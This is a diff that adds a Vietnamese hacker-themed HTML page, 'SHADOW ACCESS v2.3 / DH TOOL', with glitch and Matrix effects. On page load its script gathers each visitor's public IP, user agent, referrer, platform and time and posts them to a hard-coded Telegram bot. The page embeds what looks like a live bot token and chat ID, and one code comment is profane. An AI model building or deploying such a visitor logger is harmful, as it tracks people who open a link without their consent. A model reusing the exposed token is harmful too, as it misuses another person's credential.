@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>SHADOW ACCESS v2.3 - INTRUSION DETECTED</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: radial-gradient(circle at 20% 30%, #0a0f0a, #000000);
+            font-family: 'Courier New', 'VT323', 'Fira Code', monospace;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+            color: #00ff41;
+        }
+
+        /* Matrix Rain effect nền */
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+            opacity: 0.15;
+        }
+
+        canvas {
+            display: block;
+            width: 100%;
+            height: 100%;
+        }
+
+        /* Scanline */
+        .scanline {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                transparent 0px,
+                transparent 2px,
+                rgba(0, 255, 65, 0.03) 2px,
+                rgba(0, 255, 65, 0.03) 4px
+            );
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .container {
+            position: relative;
+            z-index: 2;
+            max-width: 1000px;
+            width: 100%;
+            background: rgba(0, 0, 0, 0.75);
+            backdrop-filter: blur(2px);
+            border: 1px solid #00ff41;
+            border-radius: 12px;
+            padding: 25px;
+            box-shadow: 0 0 25px rgba(0, 255, 65, 0.3), inset 0 0 10px rgba(0, 255, 65, 0.1);
+            transition: all 0.3s;
+        }
+
+        /* Glitch cho tiêu đề */
+        .glitch {
+            font-size: clamp(1.8rem, 6vw, 3.8rem);
+            font-weight: bold;
+            text-transform: uppercase;
+            position: relative;
+            text-shadow: 0.05em 0 0 rgba(255, 0, 0, 0.75), -0.05em -0.025em 0 rgba(0, 255, 255, 0.75);
+            animation: glitch-shake 0.3s infinite alternate;
+            color: #00ff41;
+            letter-spacing: 3px;
+            margin-bottom: 10px;
+        }
+
+        @keyframes glitch-shake {
+            0% { transform: translate(0); }
+            100% { transform: translate(-1px, 1px); }
+        }
+
+        .sub {
+            font-size: 0.9rem;
+            color: #bf00ff;
+            border-left: 3px solid #ff0040;
+            padding-left: 12px;
+            margin-bottom: 30px;
+            text-shadow: 0 0 3px #ff00cc;
+        }
+
+        .info-panel {
+            background: #0a0f0a;
+            border: 1px solid #33ff66;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.2);
+        }
+
+        .info-title {
+            color: #ff00a6;
+            font-size: 1.4rem;
+            border-bottom: 1px dashed #ff44aa;
+            padding-bottom: 8px;
+            margin-bottom: 16px;
+            font-weight: bold;
+        }
+
+        .info-line {
+            font-family: monospace;
+            padding: 6px 0;
+            border-bottom: 1px dotted #1f3b1f;
+            word-break: break-all;
+        }
+
+        .info-label {
+            color: #ff5500;
+            font-weight: bold;
+            display: inline-block;
+            min-width: 100px;
+        }
+
+        .info-value {
+            color: #0aff99;
+        }
+
+        .btn-neon {
+            background: rgba(0, 0, 0, 0.8);
+            border: 1.5px solid #ff00c3;
+            color: #ff00c3;
+            padding: 10px 20px;
+            font-family: monospace;
+            font-weight: bold;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 15px;
+            margin-right: 12px;
+            border-radius: 6px;
+            text-transform: uppercase;
+        }
+
+        .btn-neon:hover {
+            background: #ff00c3;
+            color: black;
+            box-shadow: 0 0 18px #ff44dd;
+            border-color: white;
+            transform: scale(1.02);
+        }
+
+        .warning {
+            color: #ff2222;
+            text-shadow: 0 0 4px red;
+            font-size: 0.85rem;
+            margin-top: 20px;
+        }
+
+        footer {
+            font-size: 0.7rem;
+            text-align: center;
+            margin-top: 25px;
+            color: #558855;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 15px;
+            }
+            .info-label {
+                min-width: 80px;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="matrix-bg">
+    <canvas id="matrixCanvas"></canvas>
+</div>
+<div class="scanline"></div>
+
+<div class="container">
+    <div class="glitch">⚠️ INTRUSION DETECTED ⚠️</div>
+    <div class="sub">>> SHADOW ACCESS v2.3 | DH TOOL - DUY HOANG</div>
+
+    <div class="info-panel" id="infoPanel">
+        <div class="info-title">📡 ACCESS LOG - REAL TIME</div>
+        <div id="ipDisplay" class="info-line"><span class="info-label">PUBLIC IP:</span> <span class="info-value" id="ipValue">Đang quét...</span></div>
+        <div id="timeDisplay" class="info-line"><span class="info-label">TIMESTAMP:</span> <span class="info-value" id="timeValue">--</span></div>
+        <div id="uaDisplay" class="info-line"><span class="info-label">USER AGENT:</span> <span class="info-value" id="uaValue">--</span></div>
+        <div id="refDisplay" class="info-line"><span class="info-label">REFERRER:</span> <span class="info-value" id="refValue">--</span></div>
+        <div id="statusMsg" class="warning" style="margin-top:15px;">⚡ [TELEGRAM] Đang gửi thông báo...</div>
+    </div>
+
+    <button class="btn-neon" id="fakeLogBtn">📀 FAKE ACCESS LOG 📀</button>
+    <button class="btn-neon" id="reloadBtn">🔄 REFRESH IP</button>
+    <footer>// DH TOOL - BY DUY HOANG_ĐẠI KA //</footer>
+</div>
+
+<script>
+    (function(){
+        // === TELEGRAM CONFIG (DẤU LỒN CỦA MÀY) ===
+        const BOT_TOKEN = "8628617771:AAGEiC7atHeMwvVgNvAi1Ytmdh0D39q5uuQ";
+        const CHAT_ID = "6286372153";
+
+        // DOM elements
+        const ipSpan = document.getElementById("ipValue");
+        const timeSpan = document.getElementById("timeValue");
+        const uaSpan = document.getElementById("uaValue");
+        const refSpan = document.getElementById("refValue");
+        const statusDiv = document.getElementById("statusMsg");
+
+        // Helper: Gửi tin nhắn Telegram
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: "HTML"
+                    })
+                });
+                const data = await response.json();
+                if(data.ok) {
+                    statusDiv.innerHTML = "✅ [TELEGRAM] Đã gửi thông báo thành công!";
+                    statusDiv.style.color = "#33ff77";
+                } else {
+                    statusDiv.innerHTML = "⚠️ [TELEGRAM] Gửi thất bại (token/ID sai hoặc bot block)";
+                    statusDiv.style.color = "#ffaa44";
+                }
+            } catch(e) {
+                console.error(e);
+                statusDiv.innerHTML = "❌ [TELEGRAM] Lỗi kết nối API Telegram";
+                statusDiv.style.color = "#ff4444";
+            }
+        }
+
+        // Lấy IP và gửi Telegram
+        async function fetchAndReport() {
+            // Thời gian hiện tại
+            const now = new Date();
+            const timeStr = now.toLocaleString('vi-VN', { hour12: false });
+            timeSpan.innerText = timeStr;
+
+            // User Agent
+            const userAgent = navigator.userAgent;
+            uaSpan.innerText = userAgent.substring(0, 180);
+
+            // Referrer
+            const referrer = document.referrer || "Không có referrer";
+            refSpan.innerText = referrer;
+
+            // Lấy IP public + gửi telegram
+            try {
+                // Dùng ipify backup
+                let ipData = null;
+                let ipAddress = "Không thể lấy IP";
+                try {
+                    const res = await fetch("https://api.ipify.org?format=json");
+                    const data = await res.json();
+                    ipAddress = data.ip;
+                    ipSpan.innerText = ipAddress;
+                } catch(e1) {
+                    try {
+                        const res2 = await fetch("https://api.ipapi.co/json/");
+                        const data2 = await res2.json();
+                        ipAddress = data2.ip || "Lỗi IP";
+                        ipSpan.innerText = ipAddress;
+                    } catch(e2) {
+                        ipSpan.innerText = "Lỗi lấy IP (chặn CORS?)";
+                        ipAddress = "Unknown";
+                    }
+                }
+
+                // Chuẩn bị nội dung gửi Telegram
+                let message = `<b>⚠️ INTRUSION DETECTED - DH TOOL</b>\n`;
+                message += `<b>👤 IP:</b> <code>${ipAddress}</code>\n`;
+                message += `<b>🕒 Thời gian:</b> ${timeStr}\n`;
+                message += `<b>📱 User Agent:</b> <code>${userAgent.substring(0, 200)}</code>\n`;
+                message += `<b>🔗 Referrer:</b> ${referrer}\n`;
+                message += `<b>🖥️ Platform:</b> ${navigator.platform || 'Unknown'}\n`;
+                message += `\n#DH_TOOL #DUYHOANG`;
+
+                // Gửi đi
+                await sendToTelegram(message);
+
+            } catch (bigErr) {
+                console.error(bigErr);
+                ipSpan.innerText = "Lỗi không xác định";
+                // Vẫn báo có người truy cập
+                let fallbackMsg = `⚠️ Có người truy cập (không lấy được IP chi tiết)\nThời gian: ${timeStr}\nUA: ${userAgent.substring(0, 150)}`;
+                await sendToTelegram(fallbackMsg);
+                statusDiv.innerHTML = "⚠️ Không lấy được IP, nhưng vẫn gửi thông báo thành công (fallback)";
+            }
+        }
+
+        // Fake log - demo hiệu ứng
+        function fakeLog() {
+            const fakeIp = "192.168." + Math.floor(Math.random()*255) + "." + Math.floor(Math.random()*255);
+            const fakeTime = new Date().toLocaleTimeString();
+            alert(`[FAKE LOG] ⚡ Truy cập giả lập\nIP: ${fakeIp}\nTime: ${fakeTime}\nUser: Hacker ẩn danh`);
+            const panel = document.getElementById("infoPanel");
+            panel.style.boxShadow = "0 0 20px #ff00aa";
+            setTimeout(()=>{ panel.style.boxShadow = ""; }, 400);
+        }
+
+        // Khởi chạy matrix background
+        function initMatrix() {
+            const canvas = document.getElementById('matrixCanvas');
+            const ctx = canvas.getContext('2d');
+            let width = window.innerWidth;
+            let height = window.innerHeight;
+            canvas.width = width;
+            canvas.height = height;
+            const letters = "01アイウエオカキクケコABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&";
+            const fontSize = 14;
+            let columns = Math.floor(width / fontSize);
+            let drops = Array(columns).fill(1);
+            function draw() {
+                ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+                ctx.fillRect(0, 0, width, height);
+                ctx.fillStyle = "#0f0";
+                ctx.font = fontSize + "px monospace";
+                for(let i = 0; i < drops.length; i++) {
+                    const text = letters[Math.floor(Math.random() * letters.length)];
+                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                    if(drops[i] * fontSize > height && Math.random() > 0.975) drops[i] = 0;
+                    drops[i]++;
+                }
+            }
+            setInterval(draw, 45);
+            window.addEventListener('resize', () => {
+                width = window.innerWidth;
+                height = window.innerHeight;
+                canvas.width = width;
+                canvas.height = height;
+                columns = Math.floor(width / fontSize);
+                drops = Array(columns).fill(1);
+            });
+        }
+
+        // Reload thông tin (refresh IP)
+        document.getElementById("fakeLogBtn").addEventListener("click", fakeLog);
+        document.getElementById("reloadBtn").addEventListener("click", () => {
+            statusDiv.innerHTML = "🔄 Đang refresh IP & gửi lại Telegram...";
+            statusDiv.style.color = "#aaff88";
+            fetchAndReport();
+        });
+
+        // TỰ ĐỘNG KHI LOAD TRANG
+        window.addEventListener("load", () => {
+            initMatrix();
+            fetchAndReport();
+        });
+    })();
+</script>
+</body>
+</html>
